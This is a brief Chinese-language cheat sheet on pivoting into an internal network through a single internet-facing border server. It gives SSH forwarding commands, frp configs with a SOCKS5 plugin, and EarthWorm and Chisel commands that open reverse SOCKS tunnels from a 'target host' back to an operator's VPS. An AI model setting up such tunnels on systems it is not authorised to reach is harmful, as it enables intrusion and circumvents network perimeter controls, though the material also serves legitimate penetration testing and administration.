# 内网隧道搭建与代理转发

## 场景：只有一台边界服务器可以出网

### 1. SSH 隧道（最常用）

#### 本地转发（访问内网其他服务）
```bash
# 将内网 10.0.0.5:3389 映射到本地 1080 端口
ssh -L 1080:10.0.0.5:3389 user@边界服务器 -N
# 然后 `rdesktop 127.0.0.1:1080`
```



#### 远程转发（让内网服务器访问你本地服务）

bash

```
# 将本地 8080 端口映射到内网服务器 80
ssh -R 8080:localhost:80 user@边界服务器 -N
```



#### 动态端口（SOCKS5 代理）

bash

```
ssh -D 1080 user@边界服务器 -N
# 设置浏览器或工具 socks5 代理 127.0.0.1:1080
```



### 2. frp (Fast Reverse Proxy)

**服务端配置** (你的 VPS)：

ini

```
[common]
bind_port = 7000
bind_udp_port = 7001
token = 123456
```



**客户端配置** (边界服务器)：

ini

```
[common]
server_addr = 你的VPS_IP
server_port = 7000
token = 123456

[socks5]
type = tcp
remote_port = 1080
plugin = socks5
```



启动后，本地 `127.0.0.1:1080` 即可访问内网。

### 3. EarthWorm (EW)

bash

```
# 反向 socks5
./ew_for_linux64 -s rcsocks -l 1080 -e 8888  # VPS 上
./ew_for_Win.exe -s rssocks -d VPS_IP -e 8888  # 目标主机
```



### 4. Chisel (golang 编写，跨平台)

bash

```
# 服务端 (VPS)
chisel server -p 8000 --reverse

# 客户端 (目标)
chisel client VPS_IP:8000 R:socks
```
